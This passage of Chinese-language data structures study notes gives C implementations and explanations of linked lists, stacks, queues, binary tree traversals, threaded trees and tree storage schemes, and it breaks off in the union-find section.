LocateElem(LinkList *head,DataType e){ int flag = 0; LinkList *p; p = head-\u0026gt;next; //指针p指向第一个结点 while(p){ if(p-\u0026gt;data != e){ p=p-\u0026gt;next;//继续下一个 }else{ flag = 1; break; } } return flag; } （5）定位操作\nint LocatePos(LinkList *head,DataType e){ LinkList *p;//定义一个指向单链表的结点的指针p int i; if(ListEmpty(head))//非空判断 return 0; p = head-\u0026gt;next;//指针p指向一个结点 i =1; while(p){ if(p-\u0026gt;data==e) return i; else { p=p-\u0026gt;next;//指向下一个结点 i++; } } if(!p)//如果没有找到与e相等的元素 return 0; } （6）插入新数据元素 e 到 i 位置\nint InsertList(LinkList *head,int i,DataType e){ LinkList *pre,*p;//定义第i个元素的前驱结点指针pre，新生结点指针p int j = 0; pre = head; //指针pre指向头结点 while(pre-\u0026gt;next != NULL \u0026amp;\u0026amp; j \u0026lt; i-1){ //循环直到直到i元素前驱结点 pre = pre-\u0026gt;next; j++; } if(j != i-1)//如果没找到，插入位置出错 return 0; //新生一个结点 p = (LinkList *)malloc(sizeof(LinkList)); if(!p){ exit(-1); } p-\u0026gt;data =e; //将e赋值给结点的数据域 p-\u0026gt;next = pre-\u0026gt;next; pre-\u0026gt;next =p; return 1; } （7）删除第 i 个结点\nint DeleteList(LinkList *head,int i,DataType *e){ LinkList *pre,*p; int j = 0; pre = head; while(pre-\u0026gt;next!=NULL \u0026amp;\u0026amp; pre-\u0026gt;next-\u0026gt;next != NULL \u0026amp;\u0026amp; j\u0026lt;i-1){ pre = pre-\u0026gt;next; j++; } if(j!=i-1){ return 0; } //指针p指向单链表中的第i个结点,并将该结点数据域值赋值给e p = pre-\u0026gt;next; *e =p-\u0026gt;data; //将前驱结点的指针域指向要删除结点的下一个结点 pre-\u0026gt;next =p-\u0026gt;next; free(p);//释放p指向的结点 return 1; } （8）打印单链表\nvoid PrintList(LinkList * p){//遍历输出 LinkList *q; if (ListEmpty(p)){ printf(\u0026#34;链表为空！\\n\u0026#34;); }else{ q = p-\u0026gt;next; //使指针指向下一个节点 printf(\u0026#34;链表中的数据为：\\n\u0026#34;); while (q){//q!=NULL //printf(\u0026#34;%d \u0026#34;, q-\u0026gt;data); if(q-\u0026gt;next){ printf(\u0026#34;%d-\u0026gt;\u0026#34;, q-\u0026gt;data); }else{ printf(\u0026#34;%d\u0026#34;, q-\u0026gt;data); } q = q-\u0026gt;next; } printf(\u0026#34;\\n\u0026#34;); } } （9）主函数调用测试 main()\nint main(){ LinkList *p; //创建头指针，用来存放头结点的地址。 p = CreateList(); //CreateList()函数动态创建链表并返回头结点的地址。 PrintList(p); //打印单链表数据 InsertList(p, 1, 23); PrintList(p); //打印单链表数据 int x; DeleteList(p,2,\u0026amp;x); PrintList(p); //打印单链表数据 printf(\u0026#34;删除 %d\\n\u0026#34;,x); LinkList *q; q = GetElem(p,2); printf(\u0026#34;查找到%d\\n\u0026#34;,q-\u0026gt;data); if(LocateElem(p,23)==1){ printf(\u0026#34;找到\\n\u0026#34;); } int i = LocatePos(p,23); printf(\u0026#34;%d\\n\u0026#34;,i); return 0; } 简单的单链表创建输出数据：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; //定义数据类型 typedef int DataType; typedef struct Node{ DataType data;//创建数据域 struct Node *next;//创建指针域 }LinkList; LinkList * CreateList(){ //函数返回值为LinkList * 类型。 int len, i, x; LinkList *q = (LinkList *)malloc(sizeof(LinkList)); if (!q){ printf(\u0026#34;分配头结点空间失败，程序终止！\\n\u0026#34;); exit(-1); //exit函数，退出程序。 }\tLinkList * r = q; //创建尾指针指向尾节点 r-\u0026gt;next = NULL; printf(\u0026#34;请输入链表的节点个数：len = \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;len); for (i=0; i\u0026lt;len; ++i){ printf(\u0026#34;请输入第%d个节点的值：\u0026#34;, i+1); scanf(\u0026#34;%d\u0026#34;, \u0026amp;x); LinkList *p = (LinkList *)malloc(sizeof(LinkList)); //链表的不连续性在于它的内存空间在不断地一个个分配 if (!p){ printf(\u0026#34;分配空间失败，程序终止！\\n\u0026#34;); exit(-1); } p-\u0026gt;data = x; r-\u0026gt;next = p; p-\u0026gt;next = NULL; r = p; //递归 } return q; } void PrintList(LinkList * p){//遍历输出 LinkList *q; if (isEmpty(p)){ printf(\u0026#34;链表为空！\\n\u0026#34;); }else{ q = p-\u0026gt;next; //使指针指向下一个节点 printf(\u0026#34;链表中的数据为：\\n\u0026#34;); while (q){//q!=NULL printf(\u0026#34;%d \u0026#34;, q-\u0026gt;data); q = q-\u0026gt;next; } printf(\u0026#34;\\n\u0026#34;); } } int isEmpty(LinkList *p){ int flag = 0; if(!p){ flag = 1; } return flag; } int main(){ LinkList * p; //创建头指针，用来存放头结点的地址。 p = CreateList(); //CreateList()函数动态创建链表并返回头结点的地址。\tPrintList(p); //打印单链表数据 return 0; } 3.3.2 双链表\r#\r3.3.3 循环链表\r#\r3.3.3.1 循环单链表\r#\r循环单链表（circular linkedlist）是首尾相连的一种单链表，即将最后一个结点的空指针改为指向头结点或第一个结点的形成一个环型，最后一个结点称为尾指针: rear。判断单链表为空的条件是 head-\u0026gt;next == NULL，而判断循环单链表为空的条件是 head-\u0026gt;next == head。访问第一个结点即 rear-\u0026gt;next-\u0026gt;next。\n如果将两个循环单链表（LA，LB）合成一个链表，只需将一个表的表尾和另一个表的表头连接即可。具体步骤为：\n将 LA-\u0026gt;next = LB-\u0026gt;next-\u0026gt;next; 第一个结点。 释放 LB 的头结点，free(LB-\u0026gt;next); 将 LB 的表尾与 LA 的表头相连，LB-\u0026gt;next = LA-\u0026gt;next。 LinkList *Link(LinkList *head1, LinkList *head2){ LinkList *p, *q; p = head1;//p指向1头结点 while(p-\u0026gt;next != head1){//循环使指针p指向链表的最后一个结点 p = p-\u0026gt;next; } q = head2; while(q-\u0026gt;next != head2){//同上 q = q-\u0026gt;next; } p-\u0026gt;next = head2-\u0026gt;next;//将第一个链表的尾端连接第二个链表的第一个结点 q-\u0026gt;next = head1; // 将第二个链表的尾端连接到第一个连接的第一个结点 return head1; } 说明：也可以把循环单链表中的头结点成为哨兵结点。\n3.3.3.2 循环双链表\r#\r第四章 栈和队列\r#\r4.1 栈\r#\r栈是只能在表尾进行插入或删除操作的线性表，通常我们称表尾端为栈顶，表头端为栈底，它是一种先进后出的线性表，既只能在表尾端插入元素，称为入栈，也只能在表尾端删除元素，称为退栈。栈有时又叫做 LIFO (后进先出) 表\n栈既然也是线性表，那么它也有顺序存储结构和链式存储结构两种表示方法，这两种表示方法实现类似。\n通过栈可以解决很多问题，例如数值转换、括号匹配、迷宫求解、表达式求值和汉诺塔等等问题。\n4.1.1 栈的顺序存储\r#\r4.1.1.1 存储结构\r#\r栈的存储结构用C语言描述：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define TRUE 1 #define FALSE 0 #define OK 1 #define ERROR 0 #define OVERFLOW -2 #define INIT_SIZE 20 #define INCREMENT_SIZE 5 typedef int SElemType; typedef int Status; /* * 存储结构 */ typedef struct { SElemType *base; //栈尾指针 SElemType *top; //栈顶指针 int size; //栈的大小 }SqStack; 4.1.1.2 基本运算\r#\r栈的基本运算如下：\n（1）初始化栈\n/* * 初始化栈 */ Status InitStack(SqStack *S) { S-\u0026gt;base = (SElemType*) malloc(INIT_SIZE * sizeof(SElemType)); if (!S-\u0026gt;base) { exit(OVERFLOW); } S-\u0026gt;top = S-\u0026gt;base; S-\u0026gt;size = INIT_SIZE; return OK; } （2）压栈\n压栈的算法如下：\n(1) 判断是否栈满，若满则出错，需要重新分配空间 (2) 元素 e 压入栈顶 (3) 栈顶指针加 1 /* * 压栈 */ Status Push(SqStack *S, SElemType e) { if ((S-\u0026gt;top - S-\u0026gt;base) / sizeof(SElemType) \u0026gt;= S-\u0026gt;size) { S-\u0026gt;base = (SElemType*) realloc(S-\u0026gt;base, (S-\u0026gt;size + INCREMENT_SIZE) * sizeof(SElemType)); if (!S-\u0026gt;base) { exit(OVERFLOW); } S-\u0026gt;top = S-\u0026gt;base + S-\u0026gt;size; S-\u0026gt;size += INCREMENT_SIZE; } *S-\u0026gt;top = e; S-\u0026gt;top++; return OK; } （3）退栈\n退栈的算法流程如下：\n(1) 判断是否栈空，若空则出错 (2) 获取栈顶元素 e (3) 栈顶指针减 1 /* * 退栈 */ Status Pop(SqStack *S, SElemType *e) { if (S-\u0026gt;top == S-\u0026gt;base) { return ERROR; } S-\u0026gt;top--; *e = *S-\u0026gt;top; return OK; } （4）销毁栈\n/* * 销毁栈 */ Status DestroyStack(SqStack *S) { free(S-\u0026gt;base); S-\u0026gt;base = NULL; S-\u0026gt;top = NULL; S-\u0026gt;size = 0; return OK; } （5）清空栈\n/* * 清空栈 */ Status ClearStack(SqStack *S) { S-\u0026gt;top = S-\u0026gt;base; return OK; } （6）判空\n/* * 判断栈是否为空 */ Status IsEmpty(SqStack S) { if (S.top == S.base) { return TRUE; } else return FALSE; } （7）获取栈的长度\n/* * 获取栈的长度 */ int GetLength(SqStack S) { return S.top - S.base; } （8）获取栈顶元素\n/* * 获取栈顶元素 */ Status GetTop(SqStack S, SElemType *e) { if (S.top \u0026gt; S.base) { *e = *(--S.top); return OK; } else { return ERROR; } } （9）访问元素\n/* * 访问元素 */ void visit(SElemType e) { printf(\u0026#34;%d \u0026#34;, e); } （10）遍历栈\n/* * 遍历栈 */ Status TraverseStack(SqStack S, void (*visit)(SElemType)) { while (S.top \u0026gt; S.base) { visit(*S.base); S.base++; } return OK; } （11）主函数测试\nint main() { SqStack S; if (InitStack(\u0026amp;S)) { SElemType e; int i; printf(\u0026#34;init_success\\n\u0026#34;); if (IsEmpty(S)) { printf(\u0026#34;Stack is empty\\n\u0026#34;); } for (i = 0; i \u0026lt; 10; i++) { Push(\u0026amp;S, i); } GetTop(S, \u0026amp;e); printf(\u0026#34;The first element is %d\\n\u0026#34;, e); printf(\u0026#34;length is %d\\n\u0026#34;, GetLength(S)); Pop(\u0026amp;S, \u0026amp;e); printf(\u0026#34;Pop element is %d\\n\u0026#34;, e); TraverseStack(S, *visit); if (DestroyStack(\u0026amp;S)) { printf(\u0026#34;\\ndestroy_success\\n\u0026#34;); } } } 4.1.1.3 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define TRUE 1 #define FALSE 0 #define OK 1 #define ERROR 0 #define OVERFLOW -2 #define INIT_SIZE 20 #define INCREMENT_SIZE 5 typedef int SElemType; typedef int Status; /* * 存储结构 */ typedef struct { SElemType *base; //栈尾指针 SElemType *top; //栈顶指针 int size; //栈的大小 }SqStack; /* * 初始化栈 */ Status InitStack(SqStack *S) { S-\u0026gt;base = (SElemType*) malloc(INIT_SIZE * sizeof(SElemType)); if (!S-\u0026gt;base) { exit(OVERFLOW); } S-\u0026gt;top = S-\u0026gt;base; S-\u0026gt;size = INIT_SIZE; return OK; } /* * 销毁栈 */ Status DestroyStack(SqStack *S) { free(S-\u0026gt;base); S-\u0026gt;base = NULL; S-\u0026gt;top = NULL; S-\u0026gt;size = 0; return OK; } /* * 清空栈 */ Status ClearStack(SqStack *S) { S-\u0026gt;top = S-\u0026gt;base; return OK; } /* * 判断栈是否为空 */ Status IsEmpty(SqStack S) { if (S.top == S.base) { return TRUE; } else return FALSE; } /* * 获取栈的长度 */ int GetLength(SqStack S) { return S.top - S.base; } /* * 获取栈顶元素 */ Status GetTop(SqStack S, SElemType *e) { if (S.top \u0026gt; S.base) { *e = *(--S.top); return OK; } else { return ERROR; } } /* * 压栈 */ Status Push(SqStack *S, SElemType e) { if ((S-\u0026gt;top - S-\u0026gt;base) / sizeof(SElemType) \u0026gt;= S-\u0026gt;size) { S-\u0026gt;base = (SElemType*) realloc(S-\u0026gt;base, (S-\u0026gt;size + INCREMENT_SIZE) * sizeof(SElemType)); if (!S-\u0026gt;base) { exit(OVERFLOW); } S-\u0026gt;top = S-\u0026gt;base + S-\u0026gt;size; S-\u0026gt;size += INCREMENT_SIZE; } *S-\u0026gt;top = e; S-\u0026gt;top++; return OK; } /* * 退栈 */ Status Pop(SqStack *S, SElemType *e) { if (S-\u0026gt;top == S-\u0026gt;base) { return ERROR; } S-\u0026gt;top--; *e = *S-\u0026gt;top; return OK; } /* * 访问元素 */ void visit(SElemType e) { printf(\u0026#34;%d \u0026#34;, e); } /* * 遍历栈 */ Status TraverseStack(SqStack S, void (*visit)(SElemType)) { while (S.top \u0026gt; S.base) { visit(*S.base); S.base++; } return OK; } int main() { SqStack S; if (InitStack(\u0026amp;S)) { SElemType e; int i; printf(\u0026#34;init_success\\n\u0026#34;); if (IsEmpty(S)) { printf(\u0026#34;Stack is empty\\n\u0026#34;); } for (i = 0; i \u0026lt; 10; i++) { Push(\u0026amp;S, i); } GetTop(S, \u0026amp;e); printf(\u0026#34;The first element is %d\\n\u0026#34;, e); printf(\u0026#34;length is %d\\n\u0026#34;, GetLength(S)); Pop(\u0026amp;S, \u0026amp;e); printf(\u0026#34;Pop element is %d\\n\u0026#34;, e); TraverseStack(S, *visit); if (DestroyStack(\u0026amp;S)) { printf(\u0026#34;\\ndestroy_success\\n\u0026#34;); } } } 4.2 队列\r#\r队列是一种先进先出的线性表，只能在一端插入元素，在另一端删除元素，如下图所示，允许插入元素的一端称为队尾，允许删除元素的一端称为队头。\n队列也一样有顺序和链式存储结构两种表示方法。\n4.2.1 队列的链式存储\r#\r4.2.1.1 存储结构\r#\r队列的存储结构用C语言描述：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define TRUE 1 #define FALSE 0 #define OK 1 #define ERROR 0 #define OVERFLOW -2 typedef int QElemType; typedef int Status; /* * 存储结构 */ typedef struct QNode { QElemType data; struct QNode *next; }QNode, *QueuePtr; 4.2.1.2 基本运算\r#\r队列的基本运算如下：\n（1）初始化队列\n/* * 初始化队列 */ Status InitQueue(LinkQueue *Q) { Q-\u0026gt;front = Q-\u0026gt;rear = (QueuePtr) malloc(sizeof(QNode)); if (!Q-\u0026gt;front) { exit(OVERFLOW); } Q-\u0026gt;front-\u0026gt;next = NULL; return OK; } （2）销毁队列\n/* * 销毁队列 */ Status DestroyQueue(LinkQueue *Q) { while (Q-\u0026gt;front) { Q-\u0026gt;rear = Q-\u0026gt;front-\u0026gt;next; free(Q-\u0026gt;front); Q-\u0026gt;front = Q-\u0026gt;rear; } return OK; } （3）清空队列\n/* * 清空队列 */ Status ClearQueue(LinkQueue *Q) { DestroyQueue(Q); InitQueue(Q); return OK; } （4）判空\n/* * 判断队列是否为空 */ Status IsEmpty(LinkQueue Q) { if (Q.front-\u0026gt;next == NULL) { return TRUE; } else { return FALSE; } } （5）获取队列的长度\n/* * 获取队列的长度 */ int GetLength(LinkQueue Q) { int i = 0; QueuePtr p = Q.front; while (Q.rear != p) { i++; p = p-\u0026gt;next; } return i; } （6）获取队头元素\n/* * 获取队头元素 */ Status GetHead(LinkQueue Q, QElemType *e) { QueuePtr p; if (Q.front == Q.rear) { return ERROR; } p = Q.front-\u0026gt;next; *e = p-\u0026gt;data; return OK; } （7）入队\n/* * 入队 */ Status EnQueue(LinkQueue *Q, QElemType e) { QueuePtr p = (QueuePtr) malloc(sizeof(QNode)); if (!p) { exit(OVERFLOW); } p-\u0026gt;data = e; p-\u0026gt;next = NULL; Q-\u0026gt;rear-\u0026gt;next = p; Q-\u0026gt;rear = p; return OK; } （8）出队\n/* * 出队 */ Status DeQueue(LinkQueue *Q, QElemType *e) { QueuePtr p; if (Q-\u0026gt;front == Q-\u0026gt;rear) { return ERROR; } p = Q-\u0026gt;front-\u0026gt;next; *e = p-\u0026gt;data; Q-\u0026gt;front-\u0026gt;next = p-\u0026gt;next; if (Q-\u0026gt;rear == p) { Q-\u0026gt;rear = Q-\u0026gt;front; } free(p); return OK; } （9）访问元素\n/* * 访问元素 */ void visit(QElemType e) { printf(\u0026#34;%d \u0026#34;, e); } （10）遍历队列\n/* * 遍历队列 */ Status TraverseQueue(LinkQueue Q, void (*visit)(QElemType)) { QueuePtr p = Q.front-\u0026gt;next; while (p) { visit(p-\u0026gt;data); p = p-\u0026gt;next; } return OK; } （11）主函数测试\nint main() { LinkQueue Q; if (InitQueue(\u0026amp;Q)) { QElemType e; int i; printf(\u0026#34;init_success\\n\u0026#34;); if (IsEmpty(Q)) { printf(\u0026#34;queue is empty\\n\u0026#34;); } for (i = 0; i \u0026lt; 10; i++) { EnQueue(\u0026amp;Q, i); } GetHead(Q, \u0026amp;e); printf(\u0026#34;The first element is %d\\n\u0026#34;, e); printf(\u0026#34;length is %d\\n\u0026#34;, GetLength(Q)); DeQueue(\u0026amp;Q, \u0026amp;e); printf(\u0026#34;delete element is %d\\n\u0026#34;, e); TraverseQueue(Q, *visit); if (DestroyQueue(\u0026amp;Q)) { printf(\u0026#34;\\ndestroy_success\\n\u0026#34;); } } } 4.2.1.3 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define TRUE 1 #define FALSE 0 #define OK 1 #define ERROR 0 #define OVERFLOW -2 typedef int QElemType; typedef int Status; /* * 存储结构 */ typedef struct QNode { QElemType data; struct QNode *next; }QNode, *QueuePtr; typedef struct { QueuePtr front; //队头指针 QueuePtr rear; //队尾指针 }LinkQueue; /* * 初始化队列 */ Status InitQueue(LinkQueue *Q) { Q-\u0026gt;front = Q-\u0026gt;rear = (QueuePtr) malloc(sizeof(QNode)); if (!Q-\u0026gt;front) { exit(OVERFLOW); } Q-\u0026gt;front-\u0026gt;next = NULL; return OK; } /* * 销毁队列 */ Status DestroyQueue(LinkQueue *Q) { while (Q-\u0026gt;front) { Q-\u0026gt;rear = Q-\u0026gt;front-\u0026gt;next; free(Q-\u0026gt;front); Q-\u0026gt;front = Q-\u0026gt;rear; } return OK; } /* * 清空队列 */ Status ClearQueue(LinkQueue *Q) { DestroyQueue(Q); InitQueue(Q); return OK; } /* * 判断队列是否为空 */ Status IsEmpty(LinkQueue Q) { if (Q.front-\u0026gt;next == NULL) { return TRUE; } else { return FALSE; } } /* * 获取队列的长度 */ int GetLength(LinkQueue Q) { int i = 0; QueuePtr p = Q.front; while (Q.rear != p) { i++; p = p-\u0026gt;next; } return i; } /* * 获取队头元素 */ Status GetHead(LinkQueue Q, QElemType *e) { QueuePtr p; if (Q.front == Q.rear) { return ERROR; } p = Q.front-\u0026gt;next; *e = p-\u0026gt;data; return OK; } /* * 入队 */ Status EnQueue(LinkQueue *Q, QElemType e) { QueuePtr p = (QueuePtr) malloc(sizeof(QNode)); if (!p) { exit(OVERFLOW); } p-\u0026gt;data = e; p-\u0026gt;next = NULL; Q-\u0026gt;rear-\u0026gt;next = p; Q-\u0026gt;rear = p; return OK; } /* * 出队 */ Status DeQueue(LinkQueue *Q, QElemType *e) { QueuePtr p; if (Q-\u0026gt;front == Q-\u0026gt;rear) { return ERROR; } p = Q-\u0026gt;front-\u0026gt;next; *e = p-\u0026gt;data; Q-\u0026gt;front-\u0026gt;next = p-\u0026gt;next; if (Q-\u0026gt;rear == p) { Q-\u0026gt;rear = Q-\u0026gt;front; } free(p); return OK; } /* * 访问元素 */ void visit(QElemType e) { printf(\u0026#34;%d \u0026#34;, e); } /* * 遍历队列 */ Status TraverseQueue(LinkQueue Q, void (*visit)(QElemType)) { QueuePtr p = Q.front-\u0026gt;next; while (p) { visit(p-\u0026gt;data); p = p-\u0026gt;next; } return OK; } int main() { LinkQueue Q; if (InitQueue(\u0026amp;Q)) { QElemType e; int i; printf(\u0026#34;init_success\\n\u0026#34;); if (IsEmpty(Q)) { printf(\u0026#34;queue is empty\\n\u0026#34;); } for (i = 0; i \u0026lt; 10; i++) { EnQueue(\u0026amp;Q, i); } GetHead(Q, \u0026amp;e); printf(\u0026#34;The first element is %d\\n\u0026#34;, e); printf(\u0026#34;length is %d\\n\u0026#34;, GetLength(Q)); DeQueue(\u0026amp;Q, \u0026amp;e); printf(\u0026#34;delete element is %d\\n\u0026#34;, e); TraverseQueue(Q, *visit); if (DestroyQueue(\u0026amp;Q)) { printf(\u0026#34;\\ndestroy_success\\n\u0026#34;); } } } 第五章 树\r#\r基本概念\r#\rn个结点，有n-1个边\n树中一个结点的子结点的个数称为该结点的度\n树种最大度数称为树的度\n度大于0的结点为分支结点\n度为0的结点为叶子结点\n有序树与无序树\n路径：树中两个结点之间的路径，且一定是自上而下的。\n路径长度：路径上所经历边的个数\n森林：m课互不相交的树的集合\n树的性质\r#\r树中的结点数等于所有结点的度数加1 度为m的树中第i层上至多有$m^{i-1}$个结点($i \\ge 1$) 高度为h的m叉树至多有$(m^b-1)/(m-1)$个结点 具有n个结点的m叉树的最小高度为$log_m[n(m-1)+1]$ 二叉树定义\r#\r二叉树：每个结点最多有2个子结点\n度为2的有序树：每个结点最多有2个子结点 且 必须有一个结点具有2个子结点\n二叉树可以为空，而度为2的有序树至少有三个结点。\n二叉树的孩子结点始终有左右之分，而度为2的有序树的孩子结点次序是相对的。\n满二叉树：一棵高度为h，且含有$2^h-1$个结点的二叉树为满二叉树。对于编号为i的结点，若存在，其双亲编号为[i/2]，左孩子为2i，右孩子为2i+1。\n完全二叉树：设一个高度为h，有n个结点的二叉树，当且仅当其每个结点都与高度为h的满二叉树中编号1~n的结点一一对应时，称为完全二叉树。\n性质：\n若$i \\le [n/2]$，则结点i为分支结点，否则为叶子结点。 叶子结点只可能在层次最大的两层出现。对于最大层次的叶子接待你，都依次排列在最左边的位置上。 度为1的结点若存在，则可能有一个，且是编号最大的分支结点，并且孩子结点一定是左节点。 二叉排序树：一棵二叉树，若树非空则具有如下性质：对于任意结点若存在左子树或右子树，则其左子树上所有结点的关键字均小于该结点，右子树上所有结点的关键字均大于该结点。\n平衡二叉树：树上任意结点的左子树和右子树的深度之差不超过1。\n二叉树性质\r#\r非空二叉树上的叶子结点数等于度为2的结点数加1，即$n_0=n_2+1$\n如何推导：\n$①. n=n_0+n_1+n_2$ 结点总数=$\\sum\\limits_{i=0}^{2}$度为i的结点数\n$②. n=n_1+2n_2+1$ 结点总数= 边数+1 = $\\sum\\limits_{i=0}^{2}$度为i的结点数*该结点的出度i\n非空二叉树上第k层上至多有$2^{k-1}$个结点($k \\ge 1$)\n高度为h的二叉树至多有$2^h-1$个结点($h \\ge 1$)\n结点i所在层次为$[log_2i]+1$\n具有n个($n \\ge 1$)结点的完全二叉树的高度为$[log_2n]+1$ (由4得)或$[log_2(n+1)]$ (由3得)\n二叉树存储\r#\r顺序存储：用一组连续的存储单元依次自上而下、自左至右存储完全二叉树上的结点元素。\n适合完全二叉树。\n最坏情况下会非常浪费存储空间。\nElementType tree[MAXSIZE] = {}; 链式存储：用链表来存放二叉树，二叉树中每个结点用链表的一个链结点来存储。\n含有n个结点的二叉链表，有n+1个空链域。 2n-(n-1) = n+1 2n表示总链域数，n个结点，每个结点有两个指针域 n-1表示非空链域，每个链域指向一个孩子结点，所以n-1个孩子结点就有n-1个非空链域。除了根节点，每个结点都能作为孩子结点，所以是n-1个孩子结点。 typedef struct Node { ElementType data; struct Node *lchild, *rchild; } Node, *BiTree; 二叉树遍历\r#\r先序遍历：根，左子树，右子树\n中序遍历：左子树，根，右子树\n后序遍历：左子树，右子树，根\n层次遍历：从左至右，从上至下\n递归实现\nvoid PreOrder(BiTree T) { if (T != NULL) { visit(T); PreOrder(T-\u0026gt;lchild); PreOrder(T-\u0026gt;rchild); } } void InOrder(BiTree T) { if (T != NULL) { InOrder(T-\u0026gt;lchild); visit(T); InOrder(T-\u0026gt;rchild); } } void PostOrder(BiTree T) { if (T != NULL) { PostOrder(T-\u0026gt;lchild); PostOrder(T-\u0026gt;rchild); visit(T); } } 中序遍历非递归实现\n初始时依次扫描根节点的所有左侧结点并将他们一一入栈； 出栈一个结点，访问它； 扫描该结点的右孩子结点并将其入栈； 依次扫描右孩子结点的所有左侧结点并一一入栈； 反复该过程直到栈空为止。 void InOrderTraverse(BiTree T) { Node *S; InitStack(S); BiTree p = T; while (p || !IsEmpty(S)) { if (p) { Push(S, p); p = p-\u0026gt;lchild; } else { Pop(S, p); visit(p); p = p-\u0026gt;rchild; } } } void PreOrderTraverse(BiTree T) { Node *S; InitStack(S); BiTree p = T; Push(S, p); while (p != NULL || !IsEmpty(S)) { Pop(S, p); visit(p); if (p-\u0026gt;rchild != NULL) { Push(S, p-\u0026gt;rchild); } if (p-\u0026gt;lchild != NULL) { Push(S, p-\u0026gt;lchild); } } } 后序遍历非递归实现\n待定。\n层次遍历\n初始时将根入队并访问根节点 若有左子树，则将左子树的根入队 若有右子树，则将右子树的根入队 然后出队，访问该结点 反复该过程直到队列为空 void levelOrder(BiTree T) { InitQueue(Q); BiTree p; EnQueue(Q, T); while (!isEmpty(Q)) { DeQueue(Q, p); visit(p); if (p-\u0026gt;lchild != NULL) EnQueue(Q, p-\u0026gt;lchild); if (p-\u0026gt;rchild != NULL) EnQueue(Q, p-\u0026gt;rchild); } } 遍历序列构造二叉树\r#\r先（后）序遍历序列和中序遍历序列可以确定一棵二叉树。\n而后序遍历序列和先序遍历序列不可以确定一棵二叉树。\n线索二叉树\r#\r线索化：\n若无左子树，则将左指针指向其前驱结点； 若无右子树，则将右指针指向其后继结点。 typedef struct ThreadNode { ElementType data; struct Node *lchild, *rchild; int ltag, rtag; } ThreadNode, *ThreadTree; // l(r)tag : // 0: l(r)child域指向的是孩子结点 // 1: l(r)child域指向的是前驱(后继)结点 中序线索二叉树寻找对应结点的前驱与后继更加方便。我们主要研究中序线索二叉树。\n中序线索二叉树\n前驱结点 若左指针为线索，则其指向的结点为前驱结点 若左指针为左孩子，则其左子树的最右侧结点为前驱结点 后继结点 若右指针为线索，则其指向的结点为后继结点 若右指针为右孩子，则其右子树的最左侧结点为后继结点 中序线索二叉树的线索化实现\nvoid InThread(ThreadTree \u0026amp;p, ThreadTree \u0026amp;pre) { if (p == NULL) return; InThread(p-\u0026gt;lchild, pre); if (p-\u0026gt;lchild == NULL) { p-\u0026gt;lchild = pre; p-\u0026gt;ltag = 1; } if (pre != NULL \u0026amp;\u0026amp; pre-\u0026gt;rchild == NULL) { pre-\u0026gt;rchild = p; pre-\u0026gt;rtag = 1; } pre = p; InThread(p-\u0026gt;rchild, pre); } 得到的中序线索二叉树：\n还可以将剩余两个指针利用起来，指向一个头节点的前驱与后继。\n中序线索二叉树遍历\n// 找到中序遍历的第一个结点 ThreadNode* FirstNode(ThreadNode *p) { while (p-\u0026gt;ltag == 0) p = p-\u0026gt;lchild; return p; } // 找下一个结点 ThreadNode* NextNode(ThreadNode *p) { if (p-\u0026gt;rtag == 0) // 如果右指针是孩子结点 return FirstNode(p-\u0026gt;rchild); // 找右孩子的左子树中第一个结点，为我们要的后继结点 else // 如果右指针是线索 return p-\u0026gt;rchild; // rchild就是我们要的后继结点 } // 中序线索树的遍历 void InOrder(ThreadNode *T) { for (ThreadNode *p=FirstNode(T); p != NULL; p = NextNode(p)) { visit(p); } } 树的存储\r#\r双亲表示法\n采用一组连续的存储空间来存储每个结点，同时在每个节点中增设一个伪指针，指示双亲结点在数组中的位置。根结点的下标为0，其伪指针域为-1。\ntypedef struct { ElemType data; int parent; } PTNode; typedef struct { PTNode nodes[MAX_TREE_SIZE]; int n; } PTree; 孩子表示法\n将每个结点的孩子结点都用单链表连接起来形成一个线性结构，n个结点具有n个孩子链表。\n// 孩子结点 typedef struct { int child; // 孩子结点的下标 struct CNode *next; } CNode; // 根节点 typedef struct { ElemType data; struct CNode *child; } PNode; typedef struct { PNode nodes[MAX_TREE_SIZE]; int n; } CTree; 孩子兄弟表示法\n以二叉链表作为树的存储结构，又称二叉树表示法。\n左孩子，右兄弟\ntypedef strct CSNode { ElemType data; struct CSNode *firstchild, *nextsibling; } CSNode, CSTree; 优缺点比较\n优点 缺点 双亲表示法 寻找结点的双亲结点效率高 寻找结点的孩子结点效率低 孩子表示法 寻找结点的孩子结点效率高 寻找结点的双亲结点效率低 孩子兄弟表示法 寻找结点的孩子结点效率高，方便实现树转换成二叉树 寻找结点的双亲结点效率低 树、森林与二叉树的转换\r#\r树与二叉树的转换\n规则：每个结点左指针指向它的第一个孩子结点，右指针指向它在树中的相邻兄弟结点。\n森林与二叉树的转换\n规则：将每一棵树转换为二叉树，将每棵二叉树的根依次作为上一棵二叉树的右子树。\n转换是唯一的\n树的遍历\r#\r先根遍历\n若树非空，先访问根节点，再按从左至右的顺序遍历根节点的每棵子树。\n后根遍历\n若树非空，则先按从左到右的顺序遍历根节点的每棵子树，再访问根节点。\n层次遍历\n⭐树的先根遍历序列与这棵树对应二叉树的先序遍历序列相同。\n⭐树的后根遍历序列与这棵树对应二叉树的中序遍历序列相同。\n森林的遍历\r#\r先序遍历\n若森林非空，则，\n访问森林中第一棵树的根节点\n先序遍历第一棵树的子树森林\n先序遍历除去第一棵树之后的剩余的树构成的森林\n中序遍历\n若森林非空，则，\n中序遍历第一棵树的根节点的子树森林 访问第一棵树的根节点 中序遍历除去第一棵树之后剩余的树构成的子树森林 ⭐森林的先序遍历序列与森林对应二叉树的先序遍历序列相同。\n⭐森林的中序遍历序列与森林对应二叉树的中序遍历序列相同。\n遍历序列的对应关系\r#\r树的应用-并查集\r#\r并查集是一种简单的集合表示。\n通常用树的双亲表示法作为并查集的存储结构。\n定义以下几个方法：\nInitial(S) 将集合S中的每个元素都初始化为只有一个单元素的子集合\nUnion(S, Root1, Root2)\n把集合S中的子集合（互不相交）Root2并入子集合Root1\nFind(S, X)\n查找集合S中单元素x所在子集合，并返回该子集合的名字。\nint UFSets[SIZE]; void Initial(int S[]) { for (int i = 0; i \u0026lt; size; i++) s[i] = -1; } int Find(int S[], int x) { while(S[x] \u0026gt;= 0) x 